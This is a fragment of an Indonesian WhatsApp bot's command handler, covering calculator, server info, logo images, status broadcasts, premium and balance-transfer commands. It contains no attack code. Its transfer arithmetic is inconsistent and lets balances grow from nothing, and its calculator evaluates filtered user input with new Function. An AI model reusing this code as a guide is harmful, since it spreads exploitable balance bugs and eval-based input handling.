break

case "kalkulator":
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break

case 'server': {
const response = await axios.get('http://ip-api.com/json/');
 const serverInfo = response.data;

function formatUptime(uptime) {
 let seconds = Math.floor(uptime % 60);
 let minutes = Math.floor((uptime / 60) % 60);
 let hours = Math.floor((uptime / (60 * 60)) % 24);
 let days = Math.floor(uptime / (60 * 60 * 24));

 let formattedUptime = '';
 if (days > 0) formattedUptime += `${days} days `;
 if (hours > 0) formattedUptime += `${hours} hours `;
 if (minutes > 0) formattedUptime += `${minutes} minutes `;
 if (seconds > 0) formattedUptime += `${seconds} seconds`;

 return formattedUptime;
}

 let serverMessage = `*S E R V E R - I N F O*\n\n`;
 const osInfo = (os.platform(), 1);
 const totalRAM = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(1); // in GB
 const freeRAM = (os.freemem() / (1024 * 1024 * 1024)).toFixed(1); // in GB
 const uptime = os.uptime();
 const uptimeFormatted = formatUptime(uptime);
 const processor = (os.cpus()[0].model, 1);
 const totalCores = os.cpus().length;

 serverMessage += `┌ ◦ *OS :* ${osInfo}\n`;
 serverMessage += `│ ◦ *RAM :* ${freeRAM} GB / ${totalRAM} GB\n`;
 serverMessage += `│ ◦ *Country :* ${serverInfo.country}\n`;
 serverMessage += `│ ◦ *CountryCode :* ${serverInfo.countryCode}\n`;
 serverMessage += `│ ◦ *Region :* ${serverInfo.region}\n`;
 serverMessage += `│ ◦ *RegionName :* ${serverInfo.regionName}\n`;
 serverMessage += `│ ◦ *City :* ${serverInfo.city}\n`;
 serverMessage += `│ ◦ *Zip :* ${serverInfo.zip}\n`;
 serverMessage += `│ ◦ *Lat :* ${serverInfo.lat}\n`;
 serverMessage += `│ ◦ *Lon :* ${serverInfo.lon}\n`;
 serverMessage += `│ ◦ *Timezone :* ${serverInfo.timezone}\n`;
 serverMessage += `│ ◦ *Isp :* ${serverInfo.isp}\n`;
 serverMessage += `│ ◦ *Org :* ${serverInfo.org}\n`;
 serverMessage += `│ ◦ *As :* ${serverInfo.as}\n`;
 serverMessage += `│ ◦ *Query :* ${serverInfo.query}\n`;
 serverMessage += `│ ◦ *Uptime :* ${uptimeFormatted}\n`;
 serverMessage += `└ ◦ *Processor :* ${processor}`;
reply(serverMessage);
}
break

case 'flaming1':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://shoplinks.to/Marketingalifatahifatah`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

 case 'flaming2':{
 if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
 if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://shoplinks.to/Marketingalifatahifatah`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

case 'flaming3':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://shoplinks.to/Marketingalifatahifatah`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

case 'flaming4':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://shoplinks.to/Marketingalifatahifatah`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

case 'flaming5':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://shoplinks.to/Marketingalifatahifatah`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

case 'flaming6':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)
reply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=0&backgroundColor=%23101820&text=${ini_txt}`
alifatah.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.namaown}`, body: `${global.namabot}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync(`./V5Media/theme/alifatah-v4.jpg`), sourceUrl: `https://bit.ly/m/Fauzialifatah-`
}}, image: {url:buffer}, caption: `*Sukses✅*`}, { quoted:fcall})
}
break

case 'apasih': case 'bilek': case 'jir': case 'bjir': case 'wkwk': case 'apaan': case 'kocak': case 'haha': case 'xixi': case 'bejir': case 'njir': case 'anjir': case 'loh': case 'halah': case 'heleh': case 'hilih': case 'huluh': case 'yahaha': case 'ngeri': case 'sayang': case 'syg': case 'syng': case 'amat': case 'dih': case 'hadeh': case 'haduh': case 'aduh': case 'waduh': case 'wadoh': case 'love': {
let reak = ['🗿', '😁', '🤓', '😴', '😯', '😆', '😂', '🤣', '😋', '😊', '😏', '😇', '🤫', '😪', '🤩', '😱', '😨', '🧐', '😜', '🤪', '😄', '😎', '🤑', '🤥', '🤠', '😬', '🤔', '🤕', '😈', '👿', '😅', '🤤', '🤖', '🌚', '🌝', '💀', '🙈', '🙉', '🙊', '😸', '🗣️', '👤', '👥', '😲']
let reakk = reak[Math.floor(Math.random() * reak.length)]
alifatah.sendMessage(m.chat, { react: {text: reakk, key: m.key}})
}
break

  case "report":{
  if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
  if (!q)
return reply(
  `Masukan parameter text\n*Contoh:*\n${prefix + command} kirim pesan ke owner`,
);
  teks = `*[  !  ]  ${command}*`;
  var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`;
  var teks2 = `\n\nSucces send to owner`;
  var bg_alifatah = "6282199509537@s.whatsapp.net";
  alifatah.sendMessage(
bg_alifatah,
{ text: teks + teks1, mentions: [sender] },
{ quoted:fcall },
  );
  alifatah.sendMessage(
m.chat,
{ text: teks + teks2 + teks1, mentions: [sender] },
{ quoted:fcall },
  );
}
break;

case 'upsw': {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Balas Image/video/audio/teks Dengan Caption ${prefix + command}`);
let statusJidList = JSON.parse(fs.readFileSync('./database/pendaftar.json'));
let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
let fonts = [0, 1, 2, 6, 7, 8, 9, 10];
if (mime) {
if (/audio/.test(mime)) {
await alifatah.sendMessage(
'status@broadcast',
{
audio: await quoted.download(),
mimetype: 'audio/mp4',
ptt: true,
waveform: [100, 0, 100, 0, 100, 0, 100],
},
{ backgroundColor: colors[Math.floor(Math.random() * colors.length)], statusJidList }
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
} else {
let type = /image/.test(mime) ? 'image' : /video/.test(mime) ? 'video' : false;
if (!type) reply('Type tidak didukung');
await alifatah.sendMessage(
'status@broadcast',
{
[type]: await quoted.download(),
caption: text || '',
},
{ statusJidList }
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
}
} else {
if (!text) return reply('Mana text?')
await alifatah.sendMessage(
'status@broadcast',
{ text },
{
backgroundColor: colors[Math.floor(Math.random() * colors.length)],
textArgb: 0xffffffff,
font: fonts[Math.floor(Math.random() * colors.length)],
statusJidList,
}
);
await reply(`Up status ke : ${statusJidList.length} Kontak`);
}
}
break

      case "listsw": {
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? alifatah.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await alifatah.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break

case 'mode':
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`📑 Check out this example: ${prefix + command} in public/self`)
if (q == 'public') {
alifatah.public = true
reply(mess.success)
} else if (q == 'self') {
alifatah.public = false
reply(mess.success)
}
break

case 'clearall': {
if (!isCreator) return reply(mess.owner)
alifatah.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break

case 'addprem':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6282132710183`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await alifatah.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukan nomer dengan benar`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Nomer ini *${prrkek}* Sudah premium!`)
break

case "delprem":{
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282132710183`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case "setppbotpanjang": case "setpppanjang": {
if (!isCreator) return reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await alifatah.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await alifatah.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return reply(example('dengan mengirim foto'))
}
break

case 'saldonya': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!isCreator) return reply(mess.owner)
  if (args.length >= 1) {
    let receiverNumber = args[0].trim(); // Nomor penerima
    if (!receiverNumber.endsWith('@s.whatsapp.net')) {
      // Tambahkan '@s.whatsapp.net' jika tidak ada
      receiverNumber += '@s.whatsapp.net';
    }

    // Menggunakan findIndex untuk mencari data pengguna berdasarkan ID
    const userIndex = db_saldo.findIndex((entry) => entry.id === receiverNumber);

    if (userIndex !== -1) {
      const { id, saldo, transaksi } = db_saldo[userIndex]; // Mengambil informasi dari db_saldo
      const koinPerakPengguna = cekKoinPerak(receiverNumber); // Mengambil jumlah koin perak pengguna
      reply(`*━━ CHECK INFO ━━*
 _• *Nomer:* ${receiverNumber.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(saldo)}_
 _• *Koin Perak:* ${koinPerakPengguna} Koin Perak_`);
    } else {
      reply(`Maaf, informasi untuk ID ${receiverNumber} tidak ditemukan.`);
    }
  } else {
    reply(`Format pesan tidak sesuai. Gunakan format ".sendsaldo 62xxxxx@s.whatsapp.net".`);
  }
}
break

case 'acc': case 'addsaldo':{
if (!isCreator) return reply(mess.owner)
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
m.reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
                    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  alifatah.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [m.sender]
  }, {
    quoted:fcall
  }).then(() => {
    reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    reply('Gagal mengirim pesan!');
  });
}
break

case 'transfer': case 'tf':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (m.quoted) {
if (froms == m.sender) return reply('*[ Transfer ]* failed')
if (!args[0]) return reply(`*[ Transfer ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Transfer ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply('Kebanyakan!')
let count = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (cekSaldo(m.sender,db_saldo) < 100) return reply('*[ Transfer ]* minimal 100 untuk bisa transfer!')
if (cekSaldo(m.sender, db_saldo) >= count * 100) {
minSaldo(m.sender, count * 1, db_saldo)
addSaldo(m.quoted.sender, count * 100, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer saldo sebesar *Rp. ${count}* kepada @${m.quoted.sender.split('@')[0]}`)
} else reply(`Saldo kamu tidak mencukupi untuk mentransfer saldo sebesar ${count}`)
} else if (q) {
let nominalnya = args[0].toString()
let tagnya = q.slice(args[0].length + 100, q.length).replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!(tagnya in users)) return reply('User tidak terdaftar didalam database!')
if (tagnya == m.sender) return reply('Tidak bisa transfer ke diri sendiri!')
if (!nominalnya) return reply(`Masukkan nominal nya!`)
if (isNaN(nominalnya)) return reply(`Nominal harus berupa angka!`)
if (Number(nominalnya) >= 9999999999999999) return reply('Kebanyakan!')
let count = nominalnya.length > 0 ? Math.min(9999999999999999, Math.max(parseInt(nominalnya), 100)) : Math.min(1)
if (cekSaldo(m.sender,db_saldo) <100) return reply('Minimal 100 untuk bisa transfer!')
if (cekSaldo(m.sender, db_saldo) >= count * 1) {
minSaldo(m.sender, count * 100, db_saldo)
addSaldo(tagnya, count * 100, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer balance sebesar *$${count}* kepada @${tagnya.split('@')[0]}`)
} else reply(`Balance kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
} else reply(`Gunakan dengan cara ${command} *Reply Pesan Nominal*\n\nContoh : Reply Pesan Target ${command} 100`)
}
break

case 'minsaldo':
if (!isCreator) return reply(mess.owner)
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break

case 'updateinfo': case 'bioinfo': {
  if (!isCreator) return reply(mess.owner)
  if (!text) return reply(`*Example*: ${command} Tidak Bisa Bicara WhatsApp Saja`)
  await alifatah.updateProfileStatus(text);
  reply('Berhasil Mengganti Profile Info.');
}
break

case 'remini':
case 'hd':
case 'jadihd':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!m.quoted) return reply(`Reply gambar ${prefix}${command}`)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
alifatah.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD"}, { quoted:fcall})
}
break

/*case 'payment':{
if (!isCreator) return reply(mess.owner)
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const ownername = `Fauzialifatah`
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: alifatah.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.from,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `PayyMent ${ownername}` },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image('https://telegra.ph/file/b3422e0df595b94cfaed3.jpg'),
                      hasMediaAttachment: true,
                    },
                    body: { text: `OVO`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"PAYYMENT OVO\",\"id\":\"123456789\",\"copy_code\":\-\"}"
              },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image('https://telegra.ph/file/23a1569461a7833fe2f7e.jpg'),
                      hasMediaAttachment: true,
                    },
                    body: { text: `GOPAY`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"PAYYMENT GOPAY\",\"id\":\"123456789\",\"copy_code\":\"-\"}"
              },
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image('https://telegra.ph/file/c605b34f0d4f0127735b4.jpg'),
                      hasMediaAttachment: true,
                    },
                    body: { text: `DANA`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"PAYYMENT DANA\",\"id\":\"123456789\",\"copy_code\":\"081343102258\"}"
              },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted:fcall }
    );

    await alifatah.relayMessage(m.key.remoteJid, msg.message, {
      messageId: m.key.id,
    });
}
break*/

case 'quotesislami': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const islami = [
   {
      "id": "1",
      "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
      "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
   },
   {
      "id": "2",
      "arabic": "مَنْ صَبَرَ ظَفِرَ",
      "arti": "Barang siapa bersabar, maka dia akan beruntung."
   },
   {
      "id": "3",
      "arabic": "مَنْ جَدَّ وَجَـدَ",
      "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
   },
   {
      "id": "4",
      "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
      "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
   },
   {
      "id": "5",
      "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
      "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
   },
   {
      "id": "6",
      "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
      "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
   },
   {
      "id": "7",
      "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
      "arti": "Kesabaran akan menolong segala pekerjaan."
   },
   {
      "id": "8",
      "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
      "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
   },
   {
      "id": "9",
      "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
      "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
   },
   {
      "id": "10",
      "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
      "arti": "Telur hari ini lebih baik daripada ayam esok hari."
   },
   {
      "id": "11",
      "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
      "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
   },
   {
      "id": "12",
      "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
      "arti": "Waktu itu lebih berharga daripada emas."
   },
   {
      "id": "13",
      "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
      "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
   },
   {
      "id": "14",
      "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
      "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
   },
   {
      "id": "15",
      "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
      "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
   },
   {
      "id": "16",
      "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
      "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
   },{
      "id": "17",
      "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
      "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
   },
   {
      "id": "18",
      "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
      "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
   },
   {
      "id": "19",
      "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
      "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
   },
   {
      "id": "20",
      "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
      "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
   },
   {
      "id": "21",
      "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
      "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
   },
   {
      "id": "22",
      "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
      "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
   },
   {
      "id": "23",
      "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
      "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
   },
   {
      "id": "24",
      "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
      "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
   },
   {
      "id": "25",
      "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
      "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
   }
]
    const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
    reply(`${arabic}\n${arti}`)
}
break

case 'gombal': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
